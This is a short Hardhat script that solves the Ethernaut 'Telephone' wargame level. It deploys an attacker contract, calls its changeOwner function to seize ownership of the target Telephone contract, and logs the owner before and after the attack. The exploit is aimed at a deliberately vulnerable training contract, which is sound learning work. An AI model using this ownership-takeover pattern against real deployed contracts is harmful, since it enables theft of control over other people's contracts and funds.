const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const Deployer = require("./deployer");


Runner.run(async (owner) => {
    
    //PLACE TELEPHONE CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const telephoneAddr = "0x480C17e4e0dE3949C06C8aE32DbF7493598819ca";     
    
    const telephone = await ethers.getContractAt("Telephone", telephoneAddr);
    const attacker = await Deployer.deploy();
    
    console.log();
    console.log("* * * ");
    console.log(`telephone owner is ${await telephone.owner()}`);
    
    //do the attack 
    await attacker.changeOwner(telephoneAddr, owner.address);
    
    //verify new owner 
    console.log(`telephone owner is ${await telephone.owner()}`);
    console.log("* * * ");
});
